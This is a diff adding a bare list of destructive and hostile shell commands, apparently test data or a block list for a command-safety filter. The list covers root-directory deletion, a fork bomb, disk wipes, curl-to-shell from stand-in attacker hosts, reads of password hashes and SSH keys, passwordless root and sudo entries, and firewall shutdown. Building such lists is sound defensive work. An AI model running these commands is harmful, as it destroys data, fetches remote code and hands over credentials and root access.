@@ -1,0 +1,49 @@
+rm -rf /
+rm -rf /*
+rm -rf / --no-preserve-root
+sudo rm -rf /
+sudo rm -rf /*
+rm -rf /boot
+rm -rf /etc
+rm -rf /bin
+sudo rm -rf /var/log/*
+rm -rf ~/
+rm -rf ~/*
+:(){ :|:& };:
+:(){ :|:&};:
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/urandom of=/dev/sda bs=512
+dd if=/dev/zero of=/dev/nvme0n1
+dd if=/dev/zero of=/dev/hda bs=1M
+mkfs.ext4 /dev/sda1
+mkfs.xfs /dev/nvme0n1
+mkfs -t ext4 /dev/sda
+curl http://evil.sh | sh
+curl -s http://malicious.com/payload | bash
+wget -qO- http://attacker.com/script.sh | sh
+wget http://evil.sh -O- | bash
+cat file | sh
+chmod -R 777 /
+chmod -R 777 /etc
+sudo chmod -R 0777 /usr
+chmod -R a+rwx /var
+shred /dev/sda
+wipe /dev/hda
+> /var/log/syslog
+truncate -s 0 /var/log/auth.log
+echo "" > /dev/sda
+find / -name "*.conf" -delete
+find / -exec rm -rf {} \;
+echo "3" > /proc/sysrq-trigger
+mv /etc/passwd /tmp/backup && ln -s /dev/null /etc/passwd
+cat /etc/shadow
+cat ~/.ssh/id_rsa
+chmod 777 /etc/sudoers
+sudo visudo && echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+iptables -F
+ufw disable
+systemctl stop firewalld
+rm -rf /home/user/.ssh
+chmod -R 777 /home
+sudo passwd root
+echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
